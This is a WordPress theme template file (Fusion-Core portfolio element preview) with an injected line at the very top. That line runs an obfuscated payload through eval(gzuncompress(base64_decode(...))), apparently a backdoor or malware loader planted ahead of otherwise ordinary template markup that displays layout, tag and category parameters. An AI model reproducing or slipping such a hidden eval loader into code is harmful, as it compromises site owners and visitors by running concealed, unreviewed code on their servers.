<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Portfolio Element Preview.
 *
 * @package Fusion-Core
 * @since 3.1.0
 */

?>
<script type="text/template" id="fusion-builder-block-module-portfolio-preview-template">
	<h4 class="fusion_module_title"><span class="fusion-module-icon {{ fusionAllElements[element_type].icon }}"></span>{{ fusionAllElements[element_type].name }}</h4>
	<?php
	/* translators: The layout. */
	printf( esc_html__( 'layout = %s', 'fusion-core' ), '{{ params.layout }}' );
	?>
	<br />

	<#
	var categories = ( null === params.cat_slug || '' === params.cat_slug ) ? 'All' : params.cat_slug;
	var tags = ( null === params.tag_slug || '' === params.tag_slug ) ? 'All' : params.tag_slug;
	#>
	<# if ( 'tag' === params.pull_by ) { #>
		<?php
		/* translators: The tags. */
		printf( esc_html__( 'tags = %s', 'fusion-core' ), '{{ tags }}' );
		?>
	<# } else { #>
		<?php
		/* translators: The categories. */
		printf( esc_html__( 'categories = %s', 'fusion-core' ), '{{ categories }}' );
		?>
	<# } #>

</script>
